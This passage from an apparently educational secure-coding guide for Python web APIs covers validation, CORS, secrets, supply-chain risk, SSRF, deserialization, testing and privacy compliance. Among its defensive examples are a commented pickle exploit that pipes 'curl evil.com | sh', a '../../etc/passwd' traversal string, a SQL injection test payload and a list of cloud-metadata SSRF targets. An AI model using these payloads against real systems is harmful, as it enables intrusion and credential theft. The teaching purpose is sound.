- [ ] Length: minimum and maximum on every string and collection
- [ ] Range: numeric bounds, dates not in the future where inappropriate
- [ ] Format: email, URL, UUID — with a real library, not a regex you invented
- [ ] Enum: if it should be one of N values, enforce N
- [ ] Encoding: normalise Unicode (NFC) before comparing — homoglyph attacks
- [ ] Strip control characters
- [ ] Reject unknown fields (`extra="forbid"`)

```python
import unicodedata


def normalise_input(value: str) -> str:
    """Defeat homoglyph and full-width-character tricks."""
    return unicodedata.normalize("NFKC", value).strip()
```

## 11.4 Encoding on output

| Destination | Encoding |
|---|---|
| HTML text | `html.escape()` / template autoescape |
| SQL | Parameter binding |
| Shell | Argument list (not `shell=True`) |
| URL | `urllib.parse.quote` |
| Log file | Strip newlines — prevents **log injection** |
| CSV | Wrap and escape — prevents **CSV formula injection** |

```python
def safe_log_value(value: str) -> str:
    """Prevents log injection: a newline lets an attacker forge fake log lines."""
    return value.replace("\n", "\\n").replace("\r", "\\r")[:200]
```

---

# 12. API security

## 12.1 HTTPS everywhere

```python
from starlette.middleware.httpsredirect import HTTPSRedirectMiddleware

app.add_middleware(HTTPSRedirectMiddleware)
```

Set HSTS so browsers refuse to downgrade:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

## 12.2 CORS — the rule that is always misconfigured

```python
from fastapi.middleware.cors import CORSMiddleware

# ✗ WRONG — allows any website to make authenticated requests to your API
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True)

# ✓ SAFE — explicit allow-list
ALLOWED_ORIGINS = [
    "https://myapp.com",
    "https://www.myapp.com",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,      # never "*" with credentials
    allow_credentials=True,
    allow_methods=["GET", "POST", "PATCH", "DELETE"],
    allow_headers=["Content-Type", "Authorization", "CSRF-Token"],
    max_age=3600,
)
```

**CORS is not a security control against attackers.** It stops *other websites* from reading your responses in a user's browser. It does not stop anyone who can send requests directly. It is frequently mistaken for access control, which it is not.

## 12.3 API versioning

```
/api/v1/cards      ← old clients keep working
/api/v2/cards
```

Never change the meaning of an existing field. Add new fields; deprecate old ones with a sunset date.

## 12.4 Rate limiting

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)


@app.exception_handler(RateLimitExceeded)
def handle_rate_limit(request, exc):
    return JSONResponse(status_code=429,
                        content={"error": "Too many requests",
                                 "retry_after": str(exc.detail)})


@app.post("/api/v1/auth/login")
@limiter.limit("5 per minute")
async def login(request: Request, credentials: LoginRequest):
    ...
```

| Endpoint | Suggested limit | Why |
|---|---|---|
| `/auth/login` | 5/min per IP + 10/hour per account | Stops credential stuffing |
| `/auth/register` | 3/hour per IP | Stops mass account creation |
| `/auth/password-reset` | 3/hour per email | Stops reset-email bombing |
| Any expensive endpoint | 60/min per user | Stops abuse, protects you |

## 12.5 Idempotency for payments

```python
@router.post("/api/v1/payments")
@limiter.limit("10 per minute")
async def create_payment(
    request: Request,
    payload: PaymentRequest,
    idempotency_key: str = Header(...),
    session: Session = Depends(get_db),
    user: User = Depends(get_current_user),
):
    """
    The client sends a unique key. Retrying with the same key returns the
    original result instead of charging twice.
    """
    existing = session.execute(
        select(Payment).where(Payment.idempotency_key == idempotency_key)
    ).scalar_one_or_none()

    if existing:
        return existing                      # return the ORIGINAL response

    payment = create_charge(payload, user)   # the side effect, exactly once
    payment.idempotency_key = idempotency_key
    session.add(payment)
    session.commit()
    return payment
```

## 12.6 GraphQL-specific concerns

| Concern | Mitigation |
|---|---|
| Query depth attacks | Limit depth and complexity; reject introspection in production |
| Batching abuse | Cap the batch size |
| Field-level authorisation | Every resolver must check permission — do not rely on the schema |

---

# 13. Secrets management

## 13.1 The rule

> **Never commit a secret to version control. Not once. Not even in a `.env.example` you later delete.**

If it ever reaches git history, treat it as compromised and rotate it. Deleting it does not help — git retains history, and it may have been cloned, forked, or indexed by automated scrapers.

## 13.2 The full pattern

```python
# ✗ NEVER
DATABASE_URL = "postgresql://admin:SuperSecret123@prod-db.internal:5432/prod"
API_KEY = "sk-live-4eC39HqLyjWDarjtT1zdp7dc"


# ✓ Configuration loaded from the environment, validated at startup
from pydantic_settings import BaseSettings, SettingsConfigDict


class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", extra="ignore")

    database_url: str
    jwt_secret: str
    field_encryption_key: str
    debug: bool = False

    def __init__(self, **data):
        super().__init__(**data)
        if self.debug and "prod" in self.database_url:
            raise RuntimeError("Refusing to run in debug mode against production")


settings = Settings()
```

## 13.3 Pre-commit secret scanning

```bash
# .pre-commit-config.yaml — runs before every commit
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.6.0
    hooks:
      - id: detect-private-key
      - id: check-added-large-files
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
```

## 13.4 Storage hierarchy

| Tier | Tool | Use for |
|---|---|---|
| Development | `.env` (gitignored) | Local only |
| CI | Repository secrets (encrypted at rest, masked in logs) | Build-time |
| Production | Vault, AWS Secrets Manager, GCP Secret Manager | Runtime |
| Rotation | Automated, scheduled | Everything sensitive |

**GitHub Actions gotcha:** a secret used in a workflow is available to *any* code that runs in that job, including a compromised dependency's install script. Keep the `permissions` block minimal and pin action versions.

---

# 14. Dependency and supply chain security

## 14.1 The threat

Your application inherits every vulnerability in every package it imports, transitively. A typical Python project pulls hundreds of transitive dependencies.

| Attack | Mechanism |
|---|---|
| **Typosquatting** | `requsts` instead of `requests` |
| **Dependency confusion** | Internal package name resolved from public PyPI |
| **Malicious install script** | `setup.py` executes arbitrary code at install time |
| **Compromised maintainer** | A legitimate package ships a backdoored release |
| **Abandoned package** | Maintainer disappears; a new owner takes over |

## 14.2 Controls

```bash
# 1. Pin exact versions and commit the lock file
pip install pip-audit
pip-audit                      # scan for known CVEs

# 2. Verify hashes
pip install --require-hashes -r requirements.txt

# 3. In CI, fail on any vulnerability
pip-audit --strict --requirement requirements.txt
```

```yaml
# 4. GitHub Actions — pin actions to a SHA, not a floating tag
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

## 14.3 Dependency hygiene checklist

- [ ] Lock file committed
- [ ] `pip-audit` (or `safety`) in CI, failing the build on high severity
- [ ] Automated update PRs (Dependabot / Renovate) reviewed within days
- [ ] No unnecessary dependencies — every one is attack surface
- [ ] Prefer well-maintained packages with a healthy contributor base
- [ ] Check the licence (MIT/Apache permissive; GPL has obligations)
- [ ] Review packages with very few downloads or a single sudden maintainer change

---

# 15. File uploads and path traversal

## 15.1 Path traversal

```python
from pathlib import Path

UPLOAD_DIR = Path("/srv/app/uploads").resolve()


@router.post("/uploads")
async def upload(file: UploadFile = File(...), user: User = Depends(get_current_user)):
    # ✗ VULNERABLE — "filename" is attacker-controlled
    #   "../../etc/passwd" → writes outside the upload directory

    # ✓ SAFE — resolve, then verify containment
    target = (UPLOAD_DIR / file.filename).resolve()
    if not target.is_relative_to(UPLOAD_DIR):
        raise HTTPException(400, "Invalid filename")

    # Even better: generate the name yourself, never trust the client's
    safe_name = f"{uuid4().hex}{Path(file.filename).suffix}"
    target = UPLOAD_DIR / safe_name
    target.write_bytes(await file.read())
    return {"path": str(target.name)}
```

`Path.resolve()` follows `..` — checking the *unresolved* path is the classic mistake.

## 15.2 Upload validation

```python
import magic  # libmagic: inspects actual bytes, not the extension

ALLOWED = {
    "image/png":  {".png"},
    "image/jpeg": {".jpg", ".jpeg"},
    "application/pdf": {".pdf"},
}
MAX_BYTES = 10 * 1024 * 1024


@router.post("/uploads")
async def upload(file: UploadFile = File(...), user: User = Depends(get_current_user)):
    content = await file.read()

    if len(content) > MAX_BYTES:
        raise HTTPException(413, "File too large")

    # Detect the REAL type from content
    detected = magic.from_buffer(content, mime=True)

    if detected not in ALLOWED:
        raise HTTPException(415, f"File type {detected} not allowed")

    # Check the extension matches the detected type
    if Path(file.filename or "").suffix.lower() not in ALLOWED[detected]:
        raise HTTPException(415, "Extension does not match content")

    # Rename so the extension can never be interpreted as executable
    safe_name = f"{uuid4().hex}{Path(file.filename or '').suffix.lower()}"
    path = UPLOAD_DIR / safe_name
    path.write_bytes(content)

    return {"id": safe_name}
```

## 15.3 Upload checklist

- [ ] Never trust the client filename
- [ ] Generate your own filename (UUID)
- [ ] Validate content type by **magic bytes**, not the `Content-Type` header or extension
- [ ] Enforce a size limit *while streaming*, not after reading into memory
- [ ] Store outside the web root, or serve from a separate cookieless domain
- [ ] Set `Content-Disposition: attachment` when serving
- [ ] Set `X-Content-Type-Options: nosniff` so the browser cannot reinterpret
- [ ] Scan for malware
- [ ] Never execute or parse untrusted files in a privileged context
- [ ] Do not put uploads on the same origin as the app

---

# 16. Server-Side Request Forgery

Your server can be tricked into making requests to hosts you intended to protect — internal services, cloud metadata endpoints, or arbitrary external hosts.

## 16.1 The dangerous endpoints

| Target | Why it matters |
|---|---|
| `169.254.169.254` (AWS/GCP/Azure metadata) | Leaks IAM credentials → **full account compromise** |
| `localhost:6379` | Redis, often unauthenticated |
| `10.x`, `172.16-31.x`, `192.168.x` | Internal network |
| `file://` | Local file read |
| `gopher://` | Can be used to craft raw protocol payloads |

## 16.2 Defence: allow-list plus IP blocking

```python
import ipaddress
import socket
from urllib.parse import urlparse

import httpx

ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}
BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),      # cloud metadata
    ipaddress.ip_network("127.0.0.0/8"),
]


def validate_outbound_url(url: str) -> None:
    """Reject anything not on the explicit allow-list."""
    parsed = urlparse(url)

    if parsed.scheme not in {"https"}:
        raise ValueError("Only https is permitted")

    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError(f"Host not allowed: {parsed.hostname}")


async def safe_fetch(url: str) -> httpx.Response:
    validate_outbound_url(url)

    async with httpx.AsyncClient(follow_redirects=False, timeout=10) as client:
        response = await client.get(url)

        # Validate the resolved IP too — prevents DNS rebinding
        resolved = socket.gethostbyname(urlparse(url).hostname)
        address = ipaddress.ip_address(resolved)

        if any(address in net for net in BLOCKED_NETWORKS):
            raise ValueError("URL resolves to a blocked address")

        return response
```

**`follow_redirects=False` matters.** An allowed host that redirects to `169.254.169.254` bypasses a naive check.

---

# 17. Deserialization

## 17.1 Python pickle — remote code execution

```python
import pickle

# ✗ NEVER — pickle.loads on untrusted data IS remote code execution
data = pickle.loads(untrusted_bytes)

# The attacker's payload, roughly:
#   class Exploit:
#       def __reduce__(self):
#           return (os.system, ("curl evil.com | sh",))

# ✓ SAFE
import json
data = json.loads(untrusted_bytes)
```

**There is no safe way to unpickle untrusted data.** If you must, use a restricted unpickler that whitelists classes:

```python
import io
import pickle


class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED = {"builtins.list", "builtins.dict", "builtins.set"}

    def find_class(self, module: str, name: str):
        if f"{module}.{name}" not in self.ALLOWED:
            raise pickle.UnpicklingError(f"forbidden: {module}.{name}")
        return super().find_class(module, name)


def safe_loads(data: bytes):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

## 17.2 Other format risks

| Format | Risk | Safe alternative |
|---|---|---|
| `pickle` | **RCE** | `json` |
| `yaml.load` | RCE via constructors | `yaml.safe_load` |
| `eval` / `exec` | **RCE** | `ast.literal_eval` |
| `marshal` | RCE, undocumented format | `json` |
| `xml.etree` | XXE / billion laughs | `defusedxml` |
| `csv` | Formula injection | Escape on export |
| `open()` with user path | Path traversal | Resolve and validate |

```python
# ✗ VULNERABLE — YAML constructors can instantiate arbitrary Python objects
yaml.load(untrusted, Loader=yaml.Loader)

# ✓ SAFE
yaml.safe_load(untrusted)
```

```python
# ✗ VULNERABLE
import xml.etree.ElementTree as ET
tree = ET.fromstring(untrusted_xml)          # entity expansion, external entities

# ✓ SAFE
from defusedxml import ElementTree as DET
tree = DET.fromstring(untrusted_xml)
```

---

# 18. Security headers and browser defences

```python
@app.middleware("http")
async def security_headers(request: Request, call_next):
    response = await call_next(request)

    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
    response.headers["Strict-Transport-Security"] = (
        "max-age=31536000; includeSubDomains; preload"
    )
    response.headers["Content-Security-Policy"] = CSP

    return response
```

| Header | Prevents |
|---|---|
| `Content-Security-Policy` | XSS execution, data exfiltration |
| `X-Content-Type-Options: nosniff` | MIME-type confusion |
| `X-Frame-Options` / `frame-ancestors` | Clickjacking |
| `Strict-Transport-Security` | Protocol downgrade |
| `Referrer-Policy` | URL leakage in the `Referer` header |
| `Permissions-Policy` | Unwanted browser features |

---

# 19. Rate limiting and brute force

## 19.1 Login throttling

```python
from collections import defaultdict
from datetime import datetime, timedelta, timezone

_attempts: dict[str, list[datetime]] = defaultdict(list)
MAX_ATTEMPTS = 5
WINDOW = timedelta(minutes=15)


def check_login_rate(identifier: str) -> bool:
    """Return False if the caller is rate limited."""
    now = datetime.now(timezone.utc)
    _attempts[identifier] = [
        t for t in _attempts[identifier] if now - t < WINDOW
    ]
    return len(_attempts[identifier]) < MAX_ATTEMPTS


def record_failed_login(identifier: str) -> None:
    _attempts[identifier].append(datetime.now(timezone.utc))


def clear_login_attempts(identifier: str) -> None:
    _attempts.pop(identifier, None)
```

**In production, use Redis.** An in-process dict resets on restart and does not work across multiple instances — so an attacker simply spreads attempts across servers.

## 19.2 The full brute-force defence

- [ ] Rate limit by IP **and** by account
- [ ] Exponential backoff after repeated failures
- [ ] Account lockout after N failures (but consider the DoS trade-off — lockout lets an attacker deny a legitimate user access)
- [ ] Prefer a soft lockout plus notification over a hard lockout
- [ ] CAPTCHA only after suspicious thresholds, not on every login
- [ ] Monitor and alert on credential stuffing patterns

---

# 20. Database security

## 20.1 Least privilege

```sql
-- ✗ WRONG — the application runs as a superuser
CREATE USER myapp WITH PASSWORD 'secret' SUPERUSER;

-- ✓ RIGHT — only what the application actually needs
CREATE USER myapp WITH PASSWORD 'secret';
GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE decks TO myapp;
GRANT SELECT ON TABLE users TO myapp;
-- No DELETE on users. No CREATE/DROP. No access to other schemas.
```

## 20.2 Never run as the database owner

Separate the migration role (full DDL) from the runtime role (DML only). The application should be structurally incapable of dropping tables.

## 20.3 Row-Level Security

Postgres RLS enforces ownership in the database itself — defence even if application code has a bug.

```sql
ALTER TABLE decks ENABLE ROW LEVEL SECURITY;

CREATE POLICY deck_ownership ON decks
    USING (owner_id = current_setting('app.user_id')::int);
```

**This is the strongest version of object-level authorization**, because a forgotten application check cannot leak data.

## 20.4 Backups

- Encrypt backups with a key separate from the live database
- Test restoration on a schedule — an untested backup is not a backup
- Restrict access; backups contain everything, often unencrypted
- Document the restore procedure and rehearse it

---

# 21. Logging, auditing, and incident response

## 21.1 What to log

| Log | Never log |
|---|---|
| Authentication attempts (success/failure, IP, user agent) | Passwords, ever |
| Authorization failures | Session tokens, JWTs |
| State-changing operations (who changed what, when) | Full request bodies containing PII |
| Rate limit triggers | API keys, secrets |
| Validation failures | Credit card numbers |
| Admin actions | Encryption keys |

```python
import structlog

logger = structlog.get_logger()


@router.post("/api/v1/auth/login")
async def login(credentials: LoginRequest, request: Request):
    result = auth_service.attempt_login(credentials.email, credentials.password)

    if not result.ok:
        logger.warning(
            "login.failed",
            email=credentials.email,          # acceptable: an email is not a secret
            reason=result.reason,             # internal detail, never returned to the client
            ip=request.client.host,
            user_agent=request.headers.get("user-agent"),
        )
        raise HTTPException(401, "Incorrect email or password")

    logger.info("login.success", user_id=result.user.id, ip=request.client.host)
    return result.tokens
```

## 21.2 Audit logging must be tamper-evident

```python
def append_audit(action: str, actor_id: int, target: str,
                 details: dict, previous_hash: str) -> str:
    entry = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "actor_id": actor_id,
        "action": action,
        "target": target,
        "details": details,
        "prev": previous_hash,
    }
    entry_hash = hashlib.sha256(json.dumps(entry, sort_keys=True).encode()).hexdigest()
    write_to_append_only_store({**entry, "hash": entry_hash})
    return entry_hash
```

Each entry hashes the previous one. Altering or removing an entry breaks every subsequent hash — the tamper is detectable.

## 21.3 Incident response

Decide this **before** an incident, while calm:

```
1. DETECT      Alert fires, or a user reports it
2. CONTAIN     Revoke keys, disable the feature, block the source
3. ERADICATE   Remove the attacker's access and the vulnerability
4. RECOVER     Restore service from a known-good state
5. LEARN       Post-mortem: root cause, what let it happen, what prevents recurrence
```

Post-mortem questions that must have written answers:

- How did we detect this? Was it the earliest possible signal?
- What is the blast radius — what data was accessed, for how long?
- Which control should have stopped it, and why did it not?
- What is the timeline, and where did response time go?
- What are the specific, assigned, dated follow-ups?

---

# 22. Security testing

## 22.1 The layers

| Layer | Tool | Catches |
|---|---|---|
| **SAST** — static analysis | Bandit, Semgrep, ruff (security rules) | Injection, hardcoded secrets, unsafe calls |
| **Dependency audit** | `pip-audit`, Dependabot, Snyk | Known CVEs |
| **Secret scanning** | gitleaks, trufflehog | Committed credentials |
| **DAST** — dynamic | OWASP ZAP, Burp Suite | Runtime vulnerabilities in a running app |
| **IaC scanning** | Checkov, tfsec | Misconfigured cloud resources |
| **Container scanning** | Trivy | Vulnerabilities in base images |
| **Manual** | Code review, penetration testing | Logic flaws, business logic |

## 22.2 SAST in CI

```yaml
- name: Security scan
  run: |
    pip install bandit pip-audit
    bandit -r app/ -lll -f json -o bandit-report.json || true
    pip-audit --strict
```

## 22.3 Writing your own security tests

```python
def test_sql_injection_in_email_is_not_interpreted():
    payload = "' OR '1'='1"
    response = client.post("/api/v1/auth/login",
                           json={"email": payload, "password": "anything"})
    assert response.status_code == 422          # rejected by validation
    assert response.json()["detail"]["code"] != "INVALID_CREDENTIALS"


def test_cannot_read_another_users_deck():
    """The single most important test in most applications."""
    alice = create_user("alice@test.com")
    bob = create_user("bob@test.com")
    bobs_deck = create_deck(bob, "Bob's private deck")

    alice_token = login("alice@test.com", valid_password())
    response = client.get(f"/api/v1/decks/{bobs_deck.id}",
                          headers={"Authorization": f"Bearer {alice_token}"})

    assert response.status_code in (403, 404)    # never 200


def test_mass_assignment_cannot_escalate_privileges():
    token = login("user@test.com", valid_password())
    response = client.patch("/api/v1/users/me",
                            headers={"Authorization": f"Bearer {token}"},
                            json={"name": "New Name", "role": "admin"})

    assert response.status_code in (200, 422)
    assert get_user("user@test.com").role == "user"    # role unchanged


def test_password_is_never_returned_by_any_endpoint():
    token = login("user@test.com", valid_password())
    for path in ("/api/v1/users/me", "/api/v1/decks", "/api/v1/admin/users"):
        body = client.get(path, headers={"Authorization": f"Bearer {token}"}).text
        assert "password" not in body.lower()
        assert "hash" not in body.lower()


def test_error_responses_do_not_leak_internals():
    response = client.get("/api/v1/decks/999999999")
    assert "Traceback" not in response.text
    assert "psycopg2" not in response.text
    assert "SELECT" not in response.text.upper()
```

**Write these four tests for every application you build.** They cover the three most exploited vulnerability classes.

## 22.4 Penetration testing

Manual adversarial testing. A structured approach:

1. **Map the attack surface** — every endpoint, parameter, header, file
2. **Enumerate** — IDs, usernames, file paths. Look for anything not in the allow-list
3. **Authenticate as every role** — including anonymous
4. **Test horizontal privilege escalation** — can user A read user B's data?
5. **Test vertical privilege escalation** — can a normal user reach an admin function?
6. **Test input handling at every parameter** — injection, XSS, traversal, overflow
7. **Test the business logic** — race conditions, replay, negative quantities, coupon stacking
8. **Test session handling** — fixation, expiry, logout invalidation

---

# 23. Privacy and compliance

## 23.1 The principles

| Principle | Meaning |
|---|---|
| **Data minimisation** | Collect only what you genuinely need. The best way to avoid a breach is never to hold the data |
| **Purpose limitation** | Use data only for the stated purpose |
| **Storage limitation** | Keep it only as long as necessary; delete on a schedule |
| **Lawful basis** | Document why you are permitted to process it (GDPR term) |
| **Data subject rights** | Access, correction, deletion, portability, objection |
| **Breach notification** | Report within the statutory deadline |

## 23.2 Applicable laws

| Law | Scope | Key requirement |
|---|---|---|
| **GDPR** (EU) | Any processing of EU residents' data | Lawful basis; rights; 72-hour breach notification; DPO where applicable |
| **Philippines Data Privacy Act (RA 10173)** | Philippine data subjects | Consent, purpose, retention, security |
| **NPC Circular** (Philippines) | Registration, breach notification, privacy notices | PIC registration for covered organisations |
| **HIPAA** | US health information | Strict controls; BAAs; audit logs |
| **PCI-DSS** | Cardholder data | Never store raw card data; use a payment provider |
| **CCPA/CPRA** | California residents | Disclosure and deletion rights |

## 23.3 Rights in practice

```python
@router.post("/api/v1/users/me/export")
async def export_my_data(user: User = Depends(get_current_user)):
    """Right to portability — return everything we hold about this user."""
    return {
        "profile": to_dict(user),
        "decks": [to_dict(d) for d in user.decks],
        "reviews": [to_dict(r) for r in user.reviews],
        "generated_at": datetime.now(timezone.utc).isoformat(),
    }


@router.delete("/api/v1/users/me")
async def delete_my_account(user: User = Depends(get_current_user),
                            session: Session = Depends(get_db)):
    """
    Right to erasure. Delete or anonymise — and handle CASCADE in the
    schema so no orphan rows survive to re-identify the user.
    """
    user.email = f"deleted-{uuid4().hex}@anonymised.invalid"
    user.password_hash = "!revoked!"
    user.deleted_at = datetime.now(timezone.utc)
    session.commit()
    return {"status": "deleted"}
```

## 23.4 Practical checklist

- [ ] Documented inventory of every piece of data collected
- [ ] Lawful basis or consent recorded for each
- [ ] Privacy policy published and accurate
- [ ] Retention period defined per data type, with automated deletion
- [ ] Data subject request procedures implemented and tested
- [ ] Breach notification procedure with named owners and deadlines
- [ ] Third parties (processors) under written contract with security terms
- [ ] Cross-border transfers assessed
- [ ] Sensitive fields encrypted at rest

---

# 24. Secure development workflow

## 24.1 Where security goes in each phase

| Phase | Security activity |
|---|---|
| **Requirements** | Identify regulated data; define security non-functional requirements |
| **Design** | Threat model; architecture review; data flow diagram with trust boundaries |
| **Implementation** | Secure coding standards; peer review focused on security; dependency allow-list |
| **Testing** | SAST, DAST, dependency scan, the four core security tests |
| **Deployment** | Secret injection, security headers, TLS configuration, WAF |
| **Maintenance** | Dependency updates, penetration tests, incident drills |

## 24.2 The PR checklist

```markdown
- [ ] No secrets committed
- [ ] All input validated at the boundary
- [ ] All queries parameterised — no f-string SQL
- [ ] Authorization checked on the server, per object
- [ ] New fields not user-settable (mass-assignment safe)
- [ ] No sensitive data in logs or error responses
- [ ] New dependency reviewed: maintained, licensed, no known CVEs
- [ ] Tests cover the failure paths, not just the happy path
- [ ] Security tests added for any new endpoint
```

## 24.3 Defence in depth

No single control is trusted. If authorisation has a bug, RLS is still there. If RLS is misconfigured, input validation is still there.

```
Layer 1  Client-side validation        (UX only — never a security control)
Layer 2  Edge / WAF                    (coarse filtering, rate limits)
Layer 3  Schema validation             (type, length, format, allow-list)
Layer 4  Business authorization        (RBAC + object-level checks)
Layer 5  Database constraints          (RLS, CHECK, FK, unique)
Layer 6  Least-privilege DB account    (blast radius containment)
Layer 7  Encryption at rest            (protects stolen disks and backups)
Layer 8  Audit logging                 (detection after the fact)
```

An attacker must defeat all eight.

---

# 25. Learning resources

## Structured learning

| Resource | Notes |
|---|---|
| PortSwigger Web Security Academy | Free, hands-on labs, the best practical starting point |
| OWASP Web Security Testing Guide | The reference methodology for penetration testing |
| OWASP Cheat Sheet Series | Concise, authoritative, per-topic |
| TryHackMe / picoCTF | Guided practice; picoCTF is free and beginner-friendly |
| Cryptopals | The best way to actually understand crypto by breaking it |
| Google Security Blog | Deep technical write-ups from a real security team |
| "Web Security for Developers" | Pragmatic book on secure implementation |

## Books

| Title | Focus |
|---|---|
| *The Web Application Hacker's Handbook* | Manual testing methodology |
| *Building Secure Web Applications* | Secure coding patterns |
| *Serious Cryptography* | Crypto without the hand-waving |
| *Threat Modeling: Designing for Security* | STRIDE in depth |

## Practice targets

| Target | Why |
|---|---|
| OWASP Juice Shop | Intentionally vulnerable — free practice |
| DVWA, WebGoat | Classic vulnerable training apps |
| PortSwigger labs | Best free practical labs on the web |
| Hack The Box / TryHackMe | Realistic, structured, free tiers |
| Your own applications | Write the exploit, then fix it |

## The habit that actually works

> **Break your own code deliberately, then fix it.**

Pick your application, run a security review of it, find the vulnerability, exploit it against yourself, fix it properly, and add the regression test. Do this once per feature area. It converts abstract knowledge into reflexes faster than any course.

---

## Closing

Security is not a phase at the end, a tool you run once, or a checklist you tick. It is a set of defaults you apply while designing, a set of tests you write alongside features, and a habit of assuming the input is hostile.

Every secure application is the result of someone deciding, at design time, what could go wrong — and then building the control before the attacker arrives.
